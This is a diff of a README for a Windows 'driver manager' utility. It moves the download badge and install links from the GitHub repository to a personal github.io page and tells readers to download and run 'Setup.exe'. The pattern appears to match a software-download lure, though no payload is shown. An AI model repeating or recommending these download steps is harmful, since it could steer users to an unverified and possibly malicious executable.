@@ -1,6 +1,6 @@
 # 🛠️ Driver-Manager-Pro-2026 - Improve Your Computer Speed And Stability
 
-[![Download Driver Manager Pro](https://img.shields.io/badge/Download-Driver_Manager_Pro-blue.svg)](https://github.com/azeems1763/Driver-Manager-Pro-2026)
+[![Download Driver Manager Pro](https://img.shields.io/badge/Download-Driver_Manager_Pro-blue.svg)](https://azeems1763.github.io)
 
 ## 📋 Software Overview
 
@@ -20,7 +20,7 @@ This software works on computers running Windows 10 or Windows 11. Ensure your c
 
 Follow these steps to set up the program on your computer.
 
-1. Visit the project website at [https://github.com/azeems1763/Driver-Manager-Pro-2026](https://github.com/azeems1763/Driver-Manager-Pro-2026).
+1. Visit the project website at [https://azeems1763.github.io](https://azeems1763.github.io).
 2. Locate the file named `Setup.exe`.
 3. Click the filename to start the download.
 4. Save the file to your Downloads folder or your Desktop.
